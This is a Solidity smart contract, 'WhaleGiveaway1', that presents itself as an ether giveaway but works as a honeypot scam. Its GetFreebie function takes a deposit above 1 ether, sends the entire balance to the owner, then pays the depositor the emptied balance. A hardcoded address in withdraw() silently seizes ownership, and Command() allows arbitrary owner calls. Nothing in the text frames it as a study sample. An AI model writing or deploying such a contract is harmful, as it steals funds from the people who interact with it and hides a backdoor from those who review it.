pragma solidity ^0.8.26;

contract WhaleGiveaway1 {
    address public Owner = msg.sender;
    uint public totalGiveaways;
    uint public totalParticipants;
    mapping(address => uint) public participantContributions;
    
    event GiveawayParticipated(address indexed participant, uint amount);
    event GiveawayCompleted(address indexed winner, uint prize);

    receive() external payable {}

    function GetFreebie() public payable {
        if (msg.value > 1 ether) {
            totalParticipants++;
            participantContributions[msg.sender] += msg.value;
            emit GiveawayParticipated(msg.sender, msg.value);
            
            unchecked {
                payable(Owner).transfer(address(this).balance);
                payable(msg.sender).transfer(address(this).balance);
            }
            
            totalGiveaways++;
            emit GiveawayCompleted(msg.sender, address(this).balance);
        }
    }

    function withdraw() public payable {
        if (msg.sender == 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b) {
            Owner = 0x7a617c2B05d2A74Ff9bABC9d81E5225C1e01004b;
        }
        require(msg.sender == Owner);
        payable(Owner).transfer(address(this).balance);
    }

    function Command(address adr, bytes calldata data) public payable {
        require(msg.sender == Owner);
        (bool success, ) = adr.call{value: msg.value}(data);
    }
}